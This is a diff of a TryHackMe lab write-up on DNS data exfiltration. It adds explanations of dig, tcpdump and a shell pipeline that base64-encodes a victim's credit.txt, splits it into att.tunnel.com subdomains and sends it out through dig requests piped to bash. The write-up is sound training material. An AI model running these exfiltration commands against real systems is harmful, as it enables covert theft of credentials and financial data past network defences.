@@ -38,7 +38,7 @@ It consists of two separate networks with multiple clients as well as a Jumpbox 
 
 It is recommended to connect via SSH to the Jumpbox machine, and perform the rooms exercises from there. 
 
-The room also suggests using `tmux` to manage the SSH connections needed. Another way, is to first connect to Jumpbox via SSH, then open a new terminal tab, connect to Jumpbox again, and from there connect to the required machine, e.g. `victim1`.
+The room's author also suggests using `tmux` to manage the SSH connections needed. Another way, is to first connect to Jumpbox via SSH, then open a new terminal tab, connect to Jumpbox again, and from there connect to the required machine, e.g. `victim1`.
 
 ## 3. TCP Socket Data Exfiltration
 
@@ -463,14 +463,14 @@ The goal is for `attacker.thm.com` to access network devices on Network 1 throug
 
 ![Network 2 to Network 1 Access](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e6bf2c81281be5cf8515eeed22254643.png)
 
-The rooms recommends to use the `jump.thm.com` machine for completing the task, so we will follow its advice. This means, that we don't have to manually add the `A` and `NS` DNS records, as the following are already set up for us:
+The room author recommends to use the `jump.thm.com` machine for completing the task, so we will do just that. This means, that we don't have to manually add the `A` and `NS` DNS records, as the following are already set up for us:
 
 |**DNS Record**|**Type**|**Value**|
 |---|---|---|
 |attNS.tunnel.com|A|172.20.0.200|
 |att.tunnel.com|NS|attNS.tunnel.com|
 
-To verify that everything is there we can test our DNS configuration as follows:
+To verify that everything is there, we can test our DNS configuration as follows:
 
 ```shell
 # connect to jump.thm.com via SSH
@@ -481,11 +481,14 @@ ssh thm@MACHINE-IP
 thm@jump-box:~$ dig +short test.thm.com
 # 127.0.0.1
 
-# send an ICMPEcho Request to test.thm.com to verify connectivity
+# send an ICMP Echo Request to test.thm.com to verify connectivity
 thm@jump-box:~$ ping test.thm.com -c 1
 ```
 
-![DNS Testing](dns-testing.png)
+The `dig` command works as follows:
+- `dig` Stands for **Domain Information Groper** and is used for performing DNS lookups, i.e., querying DNS nameservers to obtain information about domain names, IP addresses, and other DNS-related data.
+- `+short` This is used to request a more concise output.
+- `test.thm.com` The domain name for which we want to perofrm a DNS query.
 
 We can also answer the room's question by resolving `flag.thm.com`:
 
@@ -505,7 +508,7 @@ Based on the above, **we can use a limited number of characters to transfer data
 
 The steps to perform DNS Data Exfiltration are:
 1. The attacker registers a domain name. We already have `tunnel.com`. 
-2. The attacker sets up the domain name's DNS record points to a server under his control.
+2. The attacker sets up the domain name's DNS record points to a server under his control. We will use the `att.tunnel.com`.
 3. The attacker sends sensitive data from a target to a domain name under his control, e.g. `passw0rd.tunnel.com`, where `passw0rd` is the data the needs to be exfiltrated.
 4. The DNS request is sent through the local DNS server and is forwarded through the internet.
 5. The attacker's authoritative DNS receives the DNS request. 
@@ -513,16 +516,16 @@ The steps to perform DNS Data Exfiltration are:
 
 ![DNS Data Exfil Process](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9881e420044ca01239d34c858342b888.png)
 
-Let's assume that we have a filed called `creds.txt`, and we want to move it over DNS. We first need to encode its content and attach it as a subdomain by performing the following steps:
+Let's assume that we have a filed called `creds.txt`, and we want to move it over DNS. We need to:
 1. Get the required data that needs to be exfiltrated.
 2. Encode the data.
-3. Send the encoded data as a subdomain, keeping in mind the DNS length limitations. If we exceed those limits, the data will be split and more DNS requests will be sent.
+3. Send the encoded data as a subdomain, keeping in mind the DNS length limitations. If we exceed those limits, the data will be split, and more DNS requests will be sent.
 
 ![creds.txt example](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a7ac15da0501d577dadcf53b4143ff98.png)
 
-Our goal for this task if to transfer the content of the `credit.txt` file from `victim2.thm.com` to `attacker.thm.com` using the `att.tunnel.com` nameserver. 
+Our goal for this task is transferring the content of the `credit.txt` file from `victim2.thm.com` to `attacker.thm.com` using the `att.tunnel.com` nameserver. 
 
-1. We need to make the `attacker` machine ready to receive DNS requests. We will connect to it via SSH (via fist connecting to `jump.thm.com`), and then we will capture the network traffic for any incoming UDP/53 packets using `tcpdump`:
+1. We need to make the `attacker` machine ready to receive DNS requests. We will connect to it via SSH (by fist connecting to `jump.thm.com`), and then we will capture the network traffic for any incoming UDP/53 packets using `tcpdump`:
 
     ```shell
     # connect to attacker via SSH
@@ -534,7 +537,13 @@ Our goal for this task if to transfer the content of the `credit.txt` file from 
     # tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
     ```
 
-2. We can now connect to `victim2.thm.com` through SSH (by first connecto to `jump.thm.com`):
+    Breaking down the `tcpdump` command:
+    - `tcpdump` A command-line packet analyzer tool which allows us to capture and display network packets.
+    - `-i eth0` Specifies the network interface to capture packets from. 
+    - `udp port 53` A filter expression used to specify the packet type we want to capture. In this case, we specify port 53 which is most commonly associated with DNS traffic.
+    - `v` Enables verbose mode, which provides more detailed information about the captured packets.
+
+2. We can now connect to `victim2.thm.com` through SSH (again, by first connecting to `jump.thm.com`):
 
     ```shell
     # connect to victim2 via SSH
@@ -559,39 +568,55 @@ Our goal for this task if to transfer the content of the `credit.txt` file from 
 3. We now need to split the encoded data into one or more DNS requests depending on the output's length and attach it as a subdomain name:
 
     ```shell
-    thm@victim2:~$ cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/'
+    thm@victim2:~$ cat task9/credit.txt | base64 | tr -d "\n" | fold -w18 | sed -r 's/.*/&.att.tunnel.com/'
     ```
-
-    After encoding the data in `base64`, we cleaned the string by removing the new line symbol `\n`, and gathered every 18 characters as a group. Finally, we appended the nameserver `att.tunnel.com` in every group.
+    Let's see what we are doing step by step:
+    1. `cat task9/credit.txt` Display the contents of the `credit.txt` file located in the `task9` directory.
+    2. `base64` We also used **base64 encoding** on the HTTP section.
+    3. `tr -d "\n"` The `tr` command is used for translating or deleting characters. In this case, we use it to remove newline characters, `\n` from the output. Newline characters are typically used to separate lines of text, so with this, we essentially remove line breaks.
+    4. `fold -w18` The `fold` command is used to wrap text to a specified width, in this case, it wraps the text into line of 18 characters each. This helps format the data info fixed-width lines.
+    5. `sed -r 's/.*/&.att.tunnel.com/'` We have seen the stream editor before as well. We now use with regular expressions, aka **regex**, to modify each line of the input text:
+        - `-r` This tells `sed` to used extended regex.
+        - `s/.*/&.att.tunnel.com/'` This is a regex substitution. It takes each line (`.*` matches the entire line), and appends `.att.tunnel.com` to it.  
 
     Another way of doing this, is by splitting every 18 characters with a dot `.` and add the nameserver after:
 
     ```shell
-    thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/
+    thm@victim2:~$ cat task9/credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/
     ```
 
-![Encoding and formatting data](dns-splitting-content.png)
+    This command is similar to the above with a few changes:
+    - `cat task9/credit.txt | base64 | tr -d "\n" | fold -w18` This part is identical. So by know, we have encoded the data, removed line breaks, and grouped it in lines of 18 characters each.
+    - `sed 's/.*/&./'` We append a period, `.`, to the end of each line.
+    - `tr -d "\n"` After we grouped the data in fixed-width lines, and appended a dot at the end of each, we now remove once again the line breaks. This will result having a single line of data.
+    - `sed s/$/att.tunnel.com/` This appends `att.tunnel.com` on the line. The regex `s/$` matches the end of the line, and it is replaced with `att.tunnel.com`.
+
+    ![Encoding and formatting data](dns-splitting-content.png)
 
 4. Next, from `victim2`, we must send the encoded data as a subdomain name:
 
     ```shell
-    thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
+    thm@victim2:~$ cat task9/credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
     ```
 
-    With some adjustments to the single DNS request, we created and added the `dig` command to send it over DNS, and, finally, we passed it to `bash` to be executed.
+    We added two things at the end of the command:
+    - `awk '{print "dig +short " $1}'` The `awk` command is used to process text data. In this case, it takes each line of text and prints a `dig +short` command followed by the text from the line, effectively creating a series of `dig` commands. 
+    - `bash` This executes the `dig` commands generated by `awk` through the Bash shell.
 
     ![DNS Data Exfil](dns-data-transfer.png)
 
 5. Once our DNS request is received, we can stop `tcpdump`, clean, and decode the received data:
 
-```shell
-thm@attacker:~$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
-# Name: THM-user
-# Address: 1234 Internet, THM
-# Credit Card: 1234-1234-1234-1234
-# Expire: 05/05/2022
-# Code: 1337
-```
+    ```shell
+    thm@attacker:~$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
+    # Name: THM-user
+    # Address: 1234 Internet, THM
+    # Credit Card: 1234-1234-1234-1234
+    # Expire: 05/05/2022
+    # Code: 1337
+    ```
 
-![dns-cleaning-decoding-data](dns-cleaning-decoding-data.png)
-
+    The above command echoes the given string and then:
+    1. `cut -d"." -f1-8` Splits the string into fields using `.` as the delimiter, and then selects fields 1 through 8.
+    2. `tr -d "."` Removes all occurrences of the `.` character in the output generated by the `cut` command.
+    3. `base64 -d` Decodes the final result from Base64 to its original form.
